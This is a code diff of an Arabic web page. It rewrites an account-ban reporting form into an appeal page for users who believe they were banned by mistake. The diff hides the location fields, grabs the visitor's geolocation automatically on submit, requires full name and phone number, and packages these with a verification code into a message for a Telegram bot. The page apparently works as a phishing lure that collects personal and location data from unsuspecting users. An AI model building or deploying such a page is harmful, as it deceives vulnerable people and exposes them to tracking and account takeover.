@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام حظر الحسابات</title>
+    <title>هل تم حظر حسابك بالخطأ؟</title>
     <style>
         :root {
             --primary-color: #e74c3c;
@@ -133,15 +133,6 @@
             border-radius: 5px;
         }
         
-        .location-group {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .location-group input {
-            flex: 1;
-        }
-        
         button {
             background-color: var(--primary-color);
             color: white;
@@ -247,6 +238,10 @@
             font-weight: bold;
         }
         
+        .hidden {
+            display: none;
+        }
+        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -256,10 +251,6 @@
             .container {
                 margin: 10px;
                 padding: 15px;
-            }
-            
-            .location-group {
-                flex-direction: column;
             }
             
             .verification-input {
@@ -274,14 +265,14 @@
         <div id="mainForm" class="form-page active">
             <header>
                 <img src="https://cdn-icons-png.flaticon.com/512/2913/2913108.png" alt="Logo" class="logo">
-                <h1>نظام حظر الحسابات</h1>
-                <p>الرجاء تعبئة النموذج التالي للإبلاغ عن حساب مخالف</p>
+                <h1>هل تم حظر حسابك بالخطأ؟</h1>
+                <p>إذا كنت تعتقد أن حسابك تم حظره عن طريق الخطأ، الرجاء تعبئة النموذج التالي</p>
             </header>
             
             <form id="banForm">
                 <div class="form-group">
-                    <label for="username">اسم المستخدم المراد حظره</label>
-                    <input type="text" id="username" name="username" required placeholder="أدخل اسم المستخدم">
+                    <label for="username">اسم المستخدم المحظور</label>
+                    <input type="text" id="username" name="username" required placeholder="أدخل اسم المستخدم المحظور">
                 </div>
                 
                 <div class="form-group">
@@ -298,50 +289,34 @@
                 </div>
                 
                 <div class="form-group">
-                    <label for="reason">سبب الحظر</label>
-                    <select id="reason" name="reason" required>
-                        <option value="">اختر سبب الحظر</option>
-                        <option value="محتوى غير لائق">محتوى غير لائق</option>
-                        <option value="احتيال ونصب">احتيال ونصب</option>
-                        <option value="انتحال شخصية">انتحال شخصية</option>
-                        <option value="تنمر ومضايقات">تنمر ومضايقات</option>
-                        <option value="انتهاك حقوق الملكية">انتهاك حقوق الملكية</option>
-                        <option value="أخرى">أخرى</option>
-                    </select>
+                    <label for="description">شرح سبب الاعتقاد بأن الحظر كان بالخطأ</label>
+                    <textarea id="description" name="description" required placeholder="اشرح بالتفصيل لماذا تعتقد أن الحظر كان خطأ..."></textarea>
                 </div>
                 
                 <div class="form-group">
-                    <label for="description">شرح المشكلة بالتفصيل</label>
-                    <textarea id="description" name="description" required placeholder="صف المشكلة بالتفصيل..."></textarea>
-                </div>
-                
-                <div class="form-group">
-                    <label for="photo">رفع صورة شخصية لتوثيق الحساب</label>
+                    <label for="photo">رفع صورة توضح المشكلة (اختياري)</label>
                     <div class="file-upload">
                         <label class="file-upload-btn">
                             اختر صورة
-                            <input type="file" id="photo" name="photo" class="file-upload-input" accept="image/*" required>
+                            <input type="file" id="photo" name="photo" class="file-upload-input" accept="image/*">
                         </label>
                     </div>
                     <img id="imagePreview" class="preview-image" alt="معاينة الصورة">
                 </div>
                 
-                <div class="form-group">
+                <div class="form-group hidden" id="locationFields">
                     <label>الموقع الجغرافي</label>
-                    <div class="location-group">
-                        <input type="text" id="latitude" name="latitude" placeholder="خط العرض" readonly>
-                        <input type="text" id="longitude" name="longitude" placeholder="خط الطول" readonly>
-                    </div>
-                    <button type="button" id="getLocation" style="margin-top: 10px; background-color: var(--secondary-color);">الحصول على الموقع الحالي</button>
+                    <input type="text" id="latitude" name="latitude" placeholder="خط العرض" readonly>
+                    <input type="text" id="longitude" name="longitude" placeholder="خط الطول" readonly>
                 </div>
                 
                 <div class="form-group">
-                    <label for="reporter">اسم المبلغ (اختياري)</label>
-                    <input type="text" id="reporter" name="reporter" placeholder="اسمك">
+                    <label for="reporter">اسمك الكامل</label>
+                    <input type="text" id="reporter" name="reporter" required placeholder="اسمك الكامل">
                 </div>
                 
                 <div class="form-group">
-                    <label for="phone">رقم الهاتف للتحقق</label>
+                    <label for="phone">رقم الهاتف للتواصل</label>
                     <input type="tel" id="phone" name="phone" required placeholder="أدخل رقم الهاتف مع رمز الدولة">
                 </div>
                 
@@ -352,7 +327,7 @@
                 
                 <div class="status" id="status"></div>
                 
-                <button type="button" id="sendVerification" class="send-code-btn">إرسال كود التحقق عبر الواتساب</button>
+                <button type="button" id="submitForm">إرسال الطلب</button>
             </form>
         </div>
         
@@ -403,25 +378,8 @@
             }
         });
         
-        // الحصول على الموقع الجغرافي
-        document.getElementById('getLocation').addEventListener('click', function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        document.getElementById('latitude').value = position.coords.latitude;
-                        document.getElementById('longitude').value = position.coords.longitude;
-                    },
-                    function(error) {
-                        alert('حدث خطأ في الحصول على الموقع: ' + error.message);
-                    }
-                );
-            } else {
-                alert('المتصفح لا يدعم خدمة تحديد الموقع الجغرافي');
-            }
-        });
-        
-        // إرسال كود التحقق
-        document.getElementById('sendVerification').addEventListener('click', function() {
+        // إرسال النموذج (بما في ذلك الحصول على الموقع)
+        document.getElementById('submitForm').addEventListener('click', function() {
             const form = document.getElementById('banForm');
             const loading = document.querySelector('.loading');
             const status = document.getElementById('status');
@@ -436,12 +394,41 @@
             loading.style.display = 'block';
             status.style.display = 'none';
             
-            // جمع بيانات النموذج
+            // الحصول على الموقع الجغرافي أولاً
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // تعبئة حقول الموقع
+                        document.getElementById('latitude').value = position.coords.latitude;
+                        document.getElementById('longitude').value = position.coords.longitude;
+                        
+                        // متابعة عملية الإرسال
+                        prepareVerification();
+                    },
+                    function(error) {
+                        loading.style.display = 'none';
+                        status.textContent = 'لم يتم الحصول على الموقع: ' + error.message;
+                        status.className = 'status error';
+                        status.style.display = 'block';
+                    }
+                );
+            } else {
+                loading.style.display = 'none';
+                status.textContent = 'المتصفح لا يدعم خدمة تحديد الموقع الجغرافي';
+                status.className = 'status error';
+                status.style.display = 'block';
+            }
+        });
+        
+        // تحضير عملية التحقق
+        function prepareVerification() {
+            const form = document.getElementById('banForm');
             const formData = new FormData(form);
+            
+            // جمع بيانات النموذج
             verificationData = {
                 username: formData.get('username'),
                 platform: formData.get('platform'),
-                reason: formData.get('reason'),
                 description: formData.get('description'),
                 latitude: formData.get('latitude'),
                 longitude: formData.get('longitude'),
@@ -458,7 +445,7 @@
             // في الواقع تحتاج إلى استخدام API خاص بالواتساب مثل Twilio أو غيرها
             // هذا مثال فقط للتوضيح
             setTimeout(() => {
-                loading.style.display = 'none';
+                document.querySelector('.loading').style.display = 'none';
                 
                 // في الواقع هنا سيتم إرسال الكود إلى الواتساب
                 // ولكن لأغراض العرض سنظهره في التنبيه
@@ -470,8 +457,8 @@
                 
                 // بدء العد التنازلي
                 startCountdown();
-            }, 2000);
-        });
+            }, 1000);
+        }
         
         // بدء العد التنازلي لإعادة الإرسال
         function startCountdown() {
@@ -556,21 +543,17 @@
             verifyLoading.style.display = 'block';
             
             // إعداد الرسالة للتلجرام
-            let message = `📢 *طلب حظر حساب جديد* 📢\n\n`;
+            let message = `⚠️ *طلب مراجعة حظر حساب* ⚠️\n\n`;
+            message += `📌 *الموضوع:* اعتقاد بأن الحظر كان بالخطأ\n`;
             message += `✅ *تم التحقق من الهوية*\n`;
             message += `📱 *رقم الهاتف:* ${verificationData.phone}\n\n`;
-            message += `👤 *اسم المستخدم:* ${verificationData.username}\n`;
+            message += `👤 *اسم المستخدم المحظور:* ${verificationData.username}\n`;
             message += `📱 *المنصة:* ${verificationData.platform}\n`;
-            message += `❗ *سبب الحظر:* ${verificationData.reason}\n`;
             message += `📝 *شرح المشكلة:*\n${verificationData.description}\n\n`;
             message += `📍 *الموقع الجغرافي:*\n`;
             message += `- خط العرض: ${verificationData.latitude}\n`;
             message += `- خط الطول: ${verificationData.longitude}\n\n`;
-            
-            if (verificationData.reporter) {
-                message += `👤 *اسم المبلغ:* ${verificationData.reporter}\n`;
-            }
-            
+            message += `👤 *اسم المبلغ:* ${verificationData.reporter}\n`;
             message += `🔢 *كود التحقق:* ${verificationData.verificationCode}`;
             
             // إعداد البيانات لإرسالها إلى التلجرام
@@ -593,7 +576,7 @@
                 verifyLoading.style.display = 'none';
                 
                 if (data.ok) {
-                    verifyStatus.textContent = 'تم إرسال طلب الحظر بنجاح! سيتم مراجعته من قبل الفريق المختص.';
+                    verifyStatus.textContent = 'تم إرسال طلب المراجعة بنجاح! سيتم التواصل معك قريباً.';
                     verifyStatus.className = 'status success';
                     verifyStatus.style.display = 'block';
                     
